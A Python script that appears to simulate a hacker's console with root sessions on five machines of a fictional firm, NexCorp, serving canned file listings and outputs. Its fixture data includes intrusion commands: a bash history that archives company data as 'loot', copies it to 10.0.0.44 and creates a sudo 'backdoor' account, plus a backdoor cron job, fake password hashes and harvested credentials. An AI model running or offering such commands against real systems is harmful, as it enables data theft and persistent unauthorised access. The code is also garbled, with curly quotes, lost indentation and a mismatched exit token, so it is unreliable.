#!/usr/bin/env python3
import os, sys, time, random

R  = “\033[1;31m”
G  = “\033[1;32m”
Y  = “\033[1;33m”
C  = “\033[1;36m”
W  = “\033[1;37m”
D  = “\033[2m”
X  = “\033[0m”

def clr():
os.system(“clear”)

FS = {
“srv-prod01”: {
“/”: [
(“bin”,“d”,””,“drwxr-xr-x”),(“boot”,“d”,””,“drwxr-xr-x”),
(“etc”,“d”,””,“drwxr-xr-x”),(“home”,“d”,””,“drwxr-xr-x”),
(“opt”,“d”,””,“drwxr-xr-x”),(“root”,“d”,””,“drwx——”),
(“tmp”,“d”,””,“drwxrwxrwt”),(“usr”,“d”,””,“drwxr-xr-x”),
(“var”,“d”,””,“drwxr-xr-x”),
],
“/root”: [
(”.bash_history”,“f”,“4.1K”,”-rw—––”),
(”.ssh”,“d”,””,“drwx——”),
(“recon”,“d”,””,“drwx——”),
],
“/root/.ssh”: [
(“authorized_keys”,“f”,“412”,”-rw—––”),
(“id_rsa”,“f”,“1.7K”,”-rw—––”),
(“id_rsa.pub”,“f”,“401”,”-rw-r–r–”),
],
“/root/recon”: [
(“nmap_internal.txt”,“f”,“28K”,”-rw—––”),
(“passwords_found.txt”,“f”,“3.2K”,”-rw—––”),
],
“/etc”: [
(“passwd”,“f”,“2.8K”,”-rw-r–r–”),
(“shadow”,“f”,“4.3K”,”-rw-r—–”),
(“hosts”,“f”,“312”,”-rw-r–r–”),
(“crontab”,“f”,“1.1K”,”-rw-r–r–”),
(“ssh”,“d”,””,“drwxr-xr-x”),
],
“/var/www/html”: [
(“index.php”,“f”,“8.4K”,”-rw-r–r–”),
(“config”,“d”,””,“drwxr-x—”),
(“uploads”,“d”,””,“drwxrwxrwx”),
],
“/var/www/html/config”: [
(“db.php”,“f”,“2.1K”,”-rw-r—–”),
(“app.php”,“f”,“5.7K”,”-rw-r—–”),
(“mail.php”,“f”,“1.4K”,”-rw-r—–”),
],
“/opt/nexcorp”: [
(“data”,“d”,””,“drwxr-x—”),
(“scripts”,“d”,””,“drwxr-x—”),
(“backups”,“d”,””,“drwxr-x—”),
],
“/opt/nexcorp/data”: [
(“employees.sql”,“f”,“812K”,”-rw-r—–”),
(“clients.sql”,“f”,“1.4M”,”-rw-r—–”),
(“contracts.zip”,“f”,“3.2M”,”-rw-r—–”),
],
“/opt/nexcorp/backups”: [
(“db_backup_2026-03-18.tar.gz”,“f”,“4.8G”,”-rw-r—–”),
(“db_backup_2026-03-11.tar.gz”,“f”,“4.7G”,”-rw-r—–”),
],
“/home”: [
(“jbrown”,“d”,””,“drwxr-xr-x”),
(“mfemi”,“d”,””,“drwxr-xr-x”),
(“deploy”,“d”,””,“drwxr-xr-x”),
],
“/home/jbrown”: [
(”.bash_history”,“f”,“2.1K”,”-rw—––”),
(“notes.txt”,“f”,“884”,”-rw-r–r–”),
(“deploy_keys”,“d”,””,“drwx——”),
],
“/tmp”: [
(“tmux-1000”,“d”,””,“drwx——”),
(”.x11-unix”,“d”,””,“drwxrwxrwt”),
(“sess_4f8a”,“f”,“512”,”-rw—––”),
],
},
“db-mysql01”: {
“/”: [
(“bin”,“d”,””,“drwxr-xr-x”),(“etc”,“d”,””,“drwxr-xr-x”),
(“home”,“d”,””,“drwxr-xr-x”),(“root”,“d”,””,“drwx——”),
(“var”,“d”,””,“drwxr-xr-x”),(“tmp”,“d”,””,“drwxrwxrwt”),
],
“/root”: [
(”.bash_history”,“f”,“5.8K”,”-rw—––”),
(”.mysql_history”,“f”,“18K”,”-rw—––”),
(“dump”,“d”,””,“drwx——”),
],
“/root/dump”: [
(“nexcorp_full_2026-03-21.sql”,“f”,“2.1G”,”-rw—––”),
(“users_plain.txt”,“f”,“44K”,”-rw—––”),
(“schema.txt”,“f”,“18K”,”-rw—––”),
],
“/var/lib/mysql”: [
(“nexcorp_prod”,“d”,””,“drwx——”),
(“mysql”,“d”,””,“drwx——”),
],
“/var/lib/mysql/nexcorp_prod”: [
(“customers.ibd”,“f”,“2.1G”,”-rw-r—–”),
(“employees.ibd”,“f”,“890M”,”-rw-r—–”),
(“invoices.ibd”,“f”,“440M”,”-rw-r—–”),
(“users.ibd”,“f”,“210M”,”-rw-r—–”),
],
“/etc/mysql”: [
(“my.cnf”,“f”,“4.2K”,”-rw-r–r–”),
(“debian.cnf”,“f”,“3.2K”,”-rw—––”),
],
“/home”: [(“dbadmin”,“d”,””,“drwxr-xr-x”)],
“/home/dbadmin”: [
(”.bash_history”,“f”,“3.3K”,”-rw—––”),
(“backup.sh”,“f”,“2.1K”,”-rwxr-x—”),
(”.ssh”,“d”,””,“drwx——”),
],
“/tmp”: [
(“mysql_exfil.py”,“f”,“3.4K”,”-rwxr–r–”),
(”.hidden_shell”,“f”,“1.2K”,”-rwxr–r–”),
],
},
“wkstn-adm02”: {
“C:\”: [
(“Users”,“d”,””,””),(“Windows”,“d”,””,””),
(“Program Files”,“d”,””,””),(“Temp”,“d”,””,””),
],
“C:\Users”: [
(“kadmin”,“d”,””,””),(“Administrator”,“d”,””,””),(“Public”,“d”,””,””),
],
“C:\Users\kadmin”: [
(“Desktop”,“d”,””,””),(“Documents”,“d”,””,””),
(“Downloads”,“d”,””,””),(”.ssh”,“d”,””,””),
],
“C:\Users\kadmin\Desktop”: [
(“server_map.xlsx”,“f”,“128K”,””),
(“VPN_access.txt”,“f”,“2.1K”,””),
(“TODO.txt”,“f”,“812”,””),
],
“C:\Users\kadmin\Documents”: [
(“VPN_Credentials.docx”,“f”,“44K”,””),
(“NexCorp_Q1_Budget.xlsx”,“f”,“2.8M”,””),
(“Board_Meeting_Mar2026.pptx”,“f”,“8.4M”,””),
(“IT_Asset_Register.xlsx”,“f”,“1.1M”,””),
],
“C:\Windows\NTDS”: [
(“ntds.dit”,“f”,“11M”,””),
(“edb.log”,“f”,“4.1M”,””),
],
“C:\Temp”: [
(“beacon.exe”,“f”,“184K”,””),
(“mimikatz_output.txt”,“f”,“28K”,””),
(“lsass.dmp”,“f”,“44M”,””),
],
},
“cctv-hub”: {
“/”: [
(“bin”,“d”,””,“drwxr-xr-x”),(“etc”,“d”,””,“drwxr-xr-x”),
(“mnt”,“d”,””,“drwxr-xr-x”),(“tmp”,“d”,””,“drwxrwxrwt”),
],
“/mnt/nvr”: [
(“2026-03-21”,“d”,””,“drwxr-xr-x”),
(“2026-03-20”,“d”,””,“drwxr-xr-x”),
],
“/mnt/nvr/2026-03-21”: [
(“ch01_lobby.mp4”,“f”,“4.1G”,”-rw-r–r–”),
(“ch02_carpark.mp4”,“f”,“4.1G”,”-rw-r–r–”),
(“ch03_reception.mp4”,“f”,“4.1G”,”-rw-r–r–”),
(“ch04_corridor.mp4”,“f”,“4.1G”,”-rw-r–r–”),
(“ch05_serverroom.mp4”,“f”,“4.1G”,”-rw-r–r–”),
(“ch06_finance.mp4”,“f”,“4.1G”,”-rw-r–r–”),
(“ch07_boardroom.mp4”,“f”,“4.1G”,”-rw-r–r–”),
(“ch08_exit.mp4”,“f”,“4.1G”,”-rw-r–r–”),
],
“/etc”: [
(“hikvision”,“d”,””,“drwxr-xr-x”),
(“passwd”,“f”,“812”,”-rw-r–r–”),
(“hosts”,“f”,“214”,”-rw-r–r–”),
],
“/etc/hikvision”: [
(“device.conf”,“f”,“8.2K”,”-rw-r–r–”),
(“network.conf”,“f”,“3.1K”,”-rw-r–r–”),
(“users.conf”,“f”,“1.4K”,”-rw-r–r–”),
],
“/tmp”: [(“stream_tap.sh”,“f”,“884”,”-rwxr–r–”)],
},
“mail-ex01”: {
“C:\”: [
(“inetpub”,“d”,””,””),(“Program Files”,“d”,””,””),
(“Exports”,“d”,””,””),(“Windows”,“d”,””,””),(“Temp”,“d”,””,””),
],
“C:\inetpub\wwwroot\owa\auth”: [
(“svcdiag.aspx”,“f”,“6.1K”,””),
(“logon.aspx”,“f”,“44K”,””),
],
“C:\Exports”: [
(“ceo_mailbox_full.pst”,“f”,“1.8G”,””),
(“finance_Q1_Q2.pst”,“f”,“740M”,””),
(“hr_all_staff.pst”,“f”,“2.1G”,””),
],
“C:\Temp”: [
(“proxylogon_payload.aspx”,“f”,“4.2K”,””),
(“ad_users_dump.txt”,“f”,“88K”,””),
],
},
}

FILE_CONTENTS = {
“/etc/shadow”: (
“root:$6$rG8.sK2a$X1HJKmP9nQvLzT3wB8dYeAoU7cF5iN0pRs4tVuMxEq1yWjCb6Z.:19073:0:99999:7:::\n”
“www-data:$6$mN7.xP3b$Y2IJLnQ0oRwMaU4vC9eZfBpV8dG6jO1qSt5uWvNyFr2zXkDc7A.:19070:0:99999:7:::\n”
“jbrown:$6$pK4.yQ5c$Z3JKMoR1pSxNbV5wD0fAgCqW9eH7kP2rTu6vXwOzGs3aYlEd8B.:19071:0:99999:7:::\n”
“mfemi:$6$qL5.zR6d$A4KLNpS2qTyOcW6xE1gBhDrX0fI8lQ3sTv7wYxPaHt4bZmFe9C.:19072:0:99999:7:::\n”
“deploy:$6$rM6.aS7e$B5LMOqT3rUzPdX7yF2hCiEsY1gJ9mR4tUw8xZyQbIu5cAnGf0D.:19068:0:99999:7:::”
),
“/etc/passwd”: (
“root:x:0:0:root:/root:/bin/bash\n”
“daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n”
“www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n”
“jbrown:x:1001:1001:James Brown,,,:/home/jbrown:/bin/bash\n”
“mfemi:x:1002:1002:Michael Femi,,,:/home/mfemi:/bin/bash\n”
“deploy:x:1003:1003:Deploy User,,,:/home/deploy:/bin/bash\n”
“mysql:x:111:114:MySQL Server,,,:/var/lib/mysql:/bin/false”
),
“/etc/hosts”: (
“127.0.0.1       localhost\n”
“172.16.4.23     srv-nexcorp-prod01\n”
“172.16.4.31     db-nexcorp-mysql01\n”
“172.16.4.18     mail-nexcorp-ex01\n”
“172.16.2.11     wkstn-nxc-adm02\n”
“192.168.10.5    cctv-hub-nxc-gf”
),
“/etc/crontab”: (
“SHELL=/bin/sh\n”
“PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\n\n”
“0  2  *  *  *  root    /opt/nexcorp/scripts/db_backup.sh\n”
“30 3  *  *  *  deploy  /opt/nexcorp/scripts/deploy_check.sh\n”
“# backdoor\n”
“*/10 * * * *   root    /tmp/.x11-unix/.svc >/dev/null 2>&1”
),
“/var/www/html/config/db.php”: (
“<?php\n"
"// NexCorp Production Database\n"
"define('DB_HOST', '172.16.4.31');\n"
"define('DB_PORT', '3306');\n"
"define('DB_NAME', 'nexcorp_prod');\n"
"define('DB_USER', 'nexcorp_app');\n"
"define('DB_PASS', 'Nx@Pr0d#2024!');\n"
"?>”
),
“/root/recon/passwords_found.txt”: (
“# Credentials harvested – NexCorp\n\n”
“[SSH]\n”
“root@172.16.4.23        Nx@Pr0d#R00t2024\n”
“jbrown@172.16.4.23      James@Nexcorp1!\n\n”
“[Database]\n”
“nexcorp_app (MySQL)     Nx@Pr0d#2024!\n”
“root (MySQL)            MySQL_r00t_Nx2023\n\n”
“[VPN]\n”
“kadmin / NEXCORP        K@dmin_NxC0rp!2025”
),
“/home/jbrown/notes.txt”: (
“TODO:\n”
“- Renew SSL cert on prod (expires May 2026)\n”
“- Update backup rotation policy\n”
“- Follow up with vendor re: Tomcat patch\n\n”
“Internal IPs:\n”
“prod: 172.16.4.23\n”
“db:   172.16.4.31\n”
“mail: 172.16.4.18\n”
“cctv: 192.168.10.5”
),
“/root/.bash_history”: (
“ssh root@172.16.4.31\n”
“mysql -u root -p\n”
“cat /etc/shadow\n”
“tar czf /tmp/loot.tar.gz /opt/nexcorp/data\n”
“scp /tmp/loot.tar.gz 10.0.0.44:/received/\n”
“find / -name ’*.conf’ -readable 2>/dev/null\n”
“netstat -antup\n”
“cat /var/www/html/config/db.php\n”
“crontab -e\n”
“useradd -m -s /bin/bash -G sudo backdoor\n”
“echo ‘backdoor:P@ssw0rd123’ | chpasswd”
),
“/etc/hikvision/device.conf”: (
“[Device]\n”
“DeviceName=NexCorp-CCTV-Hub-GF\n”
“DeviceModel=DS-7608NI-K2\n”
“FirmwareVersion=V3.4.102\n\n”
“[Network]\n”
“IPAddress=192.168.10.5\n”
“SubnetMask=255.255.255.0\n”
“GatewayIPAddress=192.168.10.1\n\n”
“[RTSP]\n”
“Enabled=true\n”
“Port=554\n”
“Auth=disable\n\n”
“[Channels]\n”
“Ch01=Lobby-Main-Entrance\n”
“Ch02=Car-Park-Level-1\n”
“Ch03=Reception-Desk\n”
“Ch05=Server-Room\n”
“Ch06=Finance-Department\n”
“Ch07=Boardroom”
),
“/etc/hikvision/users.conf”: (
“[Users]\n”
“admin:12345:Administrator\n”
“operator:nexcorp2024:Operator\n”
“viewer:viewer123:ViewOnly”
),
“C:\Temp\mimikatz_output.txt”: (
“mimikatz 2.2.0 (x64)\n\n”
“User Name  : kadmin\n”
“Domain     : NEXCORP\n”
“Logon Server: NEXCORP-DC01\n\n”
“  * NTLM     : e3b0c44298fc1c149afb4c8996fb924\n”
“  * Password : K@dmin_NxC0rp!2025”
),
“C:\Users\kadmin\Desktop\VPN_access.txt”: (
“NexCorp VPN Access\n”
“——————\n”
“VPN Gateway : vpn.nexcorp.com:1194\n”
“Username    : kadmin@nexcorp.com\n”
“Password    : K@dmin_NxC0rp!2025\n”
“MFA Backup  : 84729-10384”
),
“C:\Users\kadmin\Desktop\TODO.txt”: (
“- Patch Exchange server (ProxyLogon still open??)\n”
“- Review firewall rules with Emeka\n”
“- Schedule pentest for Q2\n”
“- URGENT: follow up cctv vendor about default creds”
),
}

MACHINES = {
“1”: {
“id”: “srv-prod01”, “label”: “srv-nexcorp-prod01”,
“ip”: “172.16.4.23”, “os”: “Ubuntu 18.04.5 LTS”,
“user”: “root”, “home”: “/root”, “cwd_init”: “/root”,
“type”: “linux”, “pc”: G,
“banner”: D + “Linux srv-nexcorp-prod01 4.15.0-142-generic #146-Ubuntu SMP x86_64 GNU/Linux” + X,
},
“2”: {
“id”: “db-mysql01”, “label”: “db-nexcorp-mysql01”,
“ip”: “172.16.4.31”, “os”: “Debian GNU/Linux 10”,
“user”: “root”, “home”: “/root”, “cwd_init”: “/root”,
“type”: “linux”, “pc”: R,
“banner”: D + “Linux db-nexcorp-mysql01 4.19.0-17-amd64 #1 SMP Debian x86_64 GNU/Linux” + X,
},
“3”: {
“id”: “wkstn-adm02”, “label”: “wkstn-nxc-adm02”,
“ip”: “172.16.2.11”, “os”: “Windows 10 Pro (19045)”,
“user”: “NEXCORP\kadmin”, “home”: “C:\Users\kadmin”, “cwd_init”: “C:\Users\kadmin”,
“type”: “windows”, “pc”: Y,
“banner”: D + “Microsoft Windows [Version 10.0.19045.3693]” + X,
},
“4”: {
“id”: “cctv-hub”, “label”: “cctv-hub-nxc-gf”,
“ip”: “192.168.10.5”, “os”: “Embedded Linux (BusyBox)”,
“user”: “root”, “home”: “/”, “cwd_init”: “/”,
“type”: “linux”, “pc”: C,
“banner”: D + “BusyBox v1.30.1 built-in shell (ash)” + X,
},
“5”: {
“id”: “mail-ex01”, “label”: “mail-nexcorp-ex01”,
“ip”: “172.16.4.18”, “os”: “Windows Server 2016”,
“user”: “NT AUTHORITY\SYSTEM”, “home”: “C:\Windows\System32”, “cwd_init”: “C:\Windows\System32”,
“type”: “windows”, “pc”: Y,
“banner”: D + “Microsoft Windows [Version 10.0.14393.5125]” + X,
},
}

def fmt_ls(entries, long=False):
if long:
lines = []
for name, t, size, perms in entries:
col = C if t == “d” else W
p = perms if perms else “-rw-r–r–”
s = size if size else “-”
lines.append(D + p + “  root root  “ + s.rjust(8) + “  Mar 21 04:14” + X + “  “ + col + name + X)
return “\n”.join(lines)
parts = []
for name, t, size, perms in entries:
parts.append((C if t == “d” else W) + name + X)
return “  “.join(parts)

def resolve_path(cwd, arg):
arg = arg.strip().rstrip(”/”)
if not arg:
return cwd
if len(arg) >= 2 and arg[1] == “:”:
return arg
if arg.startswith(”/”):
return arg
if arg == “..”:
if “\” in cwd:
parts = cwd.rsplit(”\”, 1)
return parts[0] if parts[0] else “\”
parts = cwd.rsplit(”/”, 1)
return parts[0] if parts[0] else “/”
if arg == “.”:
return cwd
sep = “\” if “\” in cwd else “/”
return cwd.rstrip(sep) + sep + arg

def handle(raw, machine, cwd):
raw = raw.strip()
if not raw:
return “”, cwd
parts = raw.split()
cmd = parts[0].lower()
args = parts[1:]
fs = FS.get(machine[“id”], {})
typ = machine[“type”]

```
if cmd in ("exit", "quit"):
    return Y + "Session closed." + X, "__EXIT__"

if cmd in ("clear", "cls"):
    clr()
    return "", cwd

if cmd == "whoami":
    return machine["user"], cwd

if cmd == "id":
    if typ == "linux":
        if machine["user"] == "root":
            return "uid=0(root) gid=0(root) groups=0(root)", cwd
        return "uid=1001 gid=1001", cwd
    return "User: " + machine["user"] + "\nPrivilege: SeDebugPrivilege, SeTcbPrivilege", cwd

if cmd == "pwd":
    return cwd, cwd

if cmd == "hostname":
    return machine["label"], cwd

if cmd == "uname":
    if "-a" in args:
        return "Linux " + machine["label"] + " 4.15.0-142-generic #146-Ubuntu SMP x86_64 GNU/Linux", cwd
    return "Linux", cwd

if cmd in ("ls", "dir"):
    long = "-la" in args or "-l" in args or "-a" in args
    non_flag = [a for a in args if not a.startswith("-")]
    target = resolve_path(cwd, non_flag[0]) if non_flag else cwd
    for k in fs:
        if k.lower() == target.lower():
            return fmt_ls(fs[k], long), cwd
    return R + "ls: cannot access '" + target + "': No such file or directory" + X, cwd

if cmd == "cd":
    if not args:
        return "", machine["home"]
    target = resolve_path(cwd, args[0])
    for k in fs:
        if k.lower() == target.lower():
            return "", target
    return R + "bash: cd: " + target + ": No such file or directory" + X, cwd

if cmd in ("cat", "type"):
    if not args:
        return R + "missing operand" + X, cwd
    path = resolve_path(cwd, args[0])
    for k, v in FILE_CONTENTS.items():
        if k.lower() == path.lower():
            return v, cwd
    sep = "/" if "/" in path else "\\"
    parent_parts = path.rsplit(sep, 1)
    if len(parent_parts) == 2:
        pdir = parent_parts[0] if parent_parts[0] else "/"
        fname = parent_parts[1]
        if pdir in fs:
            for name, t, size, perms in fs[pdir]:
                if name.lower() == fname.lower():
                    if t == "f":
                        return D + "[binary or large file -- use strings or hexdump]" + X, cwd
                    return R + "cat: " + path + ": Is a directory" + X, cwd
    return R + "cat: " + path + ": No such file or directory" + X, cwd

if cmd == "ps":
    return (
        D + "  PID TTY      TIME CMD\n" + X +
        "    1 ?    00:00:03 systemd\n"
        "  214 ?    00:00:00 sshd\n"
        "  891 ?    00:00:44 apache2\n"
        " 1104 ?    00:04:21 mysqld\n"
        " 1840 pts/0 00:00:00 bash\n"
        " 2244 pts/0 00:00:00 ps"
    ), cwd

if cmd == "netstat" and typ == "linux":
    return (
        D + "Proto Local Address           Foreign Address   State\n" + X +
        "tcp   0.0.0.0:22              0.0.0.0:*         LISTEN\n"
        "tcp   0.0.0.0:80              0.0.0.0:*         LISTEN\n"
        "tcp   0.0.0.0:443             0.0.0.0:*         LISTEN\n"
        "tcp   0.0.0.0:3306            0.0.0.0:*         LISTEN\n"
        "tcp   0.0.0.0:8080            0.0.0.0:*         LISTEN\n" +
        R + "tcp   0.0.0.0:4444            0.0.0.0:*         LISTEN\n" + X +
        R + "tcp   0.0.0.0:2222            0.0.0.0:*         LISTEN\n" + X +
        "tcp   172.16.4.23:4444        10.0.0.44:51234   ESTABLISHED"
    ), cwd

if cmd in ("ifconfig", "ip"):
    return (
        D + "eth0: inet 172.16.4.23  netmask 255.255.255.0\n"
        "      ether 00:50:56:b8:4a:12\n"
        "lo:   inet 127.0.0.1  netmask 255.0.0.0" + X
    ), cwd

if cmd == "history":
    return FILE_CONTENTS.get("/root/.bash_history", ""), cwd

if cmd == "find":
    if "-name" in args:
        idx = args.index("-name")
        pattern = args[idx + 1] if idx + 1 < len(args) else "*"
        pat = pattern.strip('"').strip("'").replace("*", "")
        results = []
        for path, entries in fs.items():
            for name, t, size, perms in entries:
                if pat.lower() in name.lower():
                    sep = "/" if "/" in path else "\\"
                    results.append(path.rstrip(sep) + sep + name)
        return "\n".join(results) if results else D + "(no results)" + X, cwd
    return D + "usage: find / -name 'pattern'" + X, cwd

if cmd in ("wget", "curl"):
    url = args[0] if args else "http://10.0.0.44"
    time.sleep(1.2)
    fname = url.split("/")[-1] or "index.html"
    size = str(random.randint(10000, 500000))
    return (
        D + "Connecting to " + url + "... connected.\n"
        "HTTP request sent... 200 OK\n"
        "Length: " + size + " bytes\n"
        "Saving to: '" + fname + "'\n" +
        fname + "   100%[==========>] done." + X
    ), cwd

if cmd == "ssh":
    host = args[-1] if args else "unknown"
    time.sleep(0.8)
    return G + "Connected to " + host + X, cwd

if cmd in ("python3", "python"):
    return D + "Python 3.8.10\nType exit() to quit." + X, cwd

if cmd == "mysql":
    return D + "Welcome to the MySQL monitor.\nmysql>" + X, cwd

if cmd in ("sudo", "su"):
    return D + "already root" + X, cwd

if cmd == "ipconfig" and typ == "windows":
    return (
        D + "Ethernet adapter Ethernet0:\n"
        "   IPv4 Address  : 172.16.2.11\n"
        "   Subnet Mask   : 255.255.255.0\n"
        "   Default Gateway: 172.16.2.1" + X
    ), cwd

if cmd == "systeminfo" and typ == "windows":
    return (
        D + "Host Name:    WKSTN-NXC-ADM02\n"
        "OS:           Windows 10 Pro 10.0.19045\n"
        "Domain:       NEXCORP\n"
        "Logon Server: NEXCORP-DC01\n"
        "RAM:          16,384 MB" + X
    ), cwd

if cmd == "net" and args and args[0] == "user":
    return (
        D + "User accounts for WKSTN-NXC-ADM02\n\n"
        "Administrator   kadmin   Guest\n"
        "domain_svc      backup_svc" + X
    ), cwd

if cmd == "tasklist":
    return (
        D + "Image Name          PID    Mem Usage\n"
        "==================  =====  =========\n"
        "svchost.exe           888   24,560 K\n"
        "lsass.exe             692   18,240 K\n"
        "explorer.exe         2144   84,120 K\n" + X +
        R + "beacon.exe           3812   12,440 K" + X
    ), cwd

if cmd == "help":
    if typ == "linux":
        return (
            D + "ls  ls -la  cd  pwd  cat  ps  netstat  ifconfig\n"
            "find -name  history  wget  curl  ssh  whoami  id\n"
            "uname -a  hostname  mysql  python3  clear  exit" + X
        ), cwd
    return (
        D + "dir  cd  type  whoami  ipconfig  systeminfo\n"
        "net user  tasklist  hostname  cls  exit" + X
    ), cwd

if typ == "linux":
    return R + "bash: " + parts[0] + ": command not found" + X, cwd
return R + "'" + parts[0] + "' is not recognized as a command." + X, cwd
```

def run_shell(machine):
clr()
cwd = machine[“cwd_init”]
print(”\n” + C + “=” * 54 + X)
print(C + “  SESSION: “ + machine[“label”] + “ (” + machine[“ip”] + “)” + X)
print(C + “=” * 54 + X)
print(machine[“banner”])
print(D + “  OS: “ + machine[“os”] + “  |  User: “ + machine[“user”] + X + “\n”)
while True:
if machine[“type”] == “linux”:
sym = “#” if machine[“user”] == “root” else “$”
prompt = machine[“pc”] + machine[“user”] + “@” + machine[“label”] + X + “:” + C + cwd + X + sym + “ “
else:
prompt = machine[“pc”] + cwd + “>” + X + “ “
try:
raw = input(prompt)
except (EOFError, KeyboardInterrupt):
print()
break
output, new_cwd = handle(raw, machine, cwd)
if new_cwd == “**EXIT**”:
if output:
print(output)
break
cwd = new_cwd
if output:
print(output)

def main():
while True:
clr()
print(
“\n” + R +
“  ######  #######  #####  ##      ####### ##    ##\n”
“  ##   ## ##      ##   ## ##      ##    ## ##  ## \n”
“  ######  #####   ##   ## ##      ##    ##  ####  \n”
“  ##   ## ##      ##   ## ##      ##    ##   ##   \n”
“  ##   ## ####### #####  #######  #######   ##   \n” + X
)
print(D + “  NexCorp Industries – Active Sessions” + X)
print(C + “  “ + “-” * 50 + X)
print(”  “ + G + “[1]” + X + “  “ + G + “srv-nexcorp-prod01” + X + “   “ + D + “172.16.4.23   Ubuntu 18.04   ROOT” + X)
print(”  “ + R + “[2]” + X + “  “ + R + “db-nexcorp-mysql01” + X + “   “ + D + “172.16.4.31   Debian 10      ROOT  EXFIL” + X)
print(”  “ + Y + “[3]” + X + “  “ + Y + “wkstn-nxc-adm02  “ + X + “   “ + D + “172.16.2.11   Windows 10     SYSTEM” + X)
print(”  “ + C + “[4]” + X + “  “ + C + “cctv-hub-nxc-gf  “ + X + “   “ + D + “192.168.10.5  Embedded Linux ROOT” + X)
print(”  “ + Y + “[5]” + X + “  “ + Y + “mail-nexcorp-ex01” + X + “   “ + D + “172.16.4.18   Win Server     SYSTEM” + X)
print(”\n  “ + D + “[q]  quit” + X)
print(C + “  “ + “-” * 50 + X)
try:
choice = input(”  “ + W + “Select session > “ + X).strip().lower()
except (EOFError, KeyboardInterrupt):
print()
break
if choice in MACHINES:
run_shell(MACHINES[choice])
elif choice == “q”:
clr()
break

if **name** == “**main**”:
main()
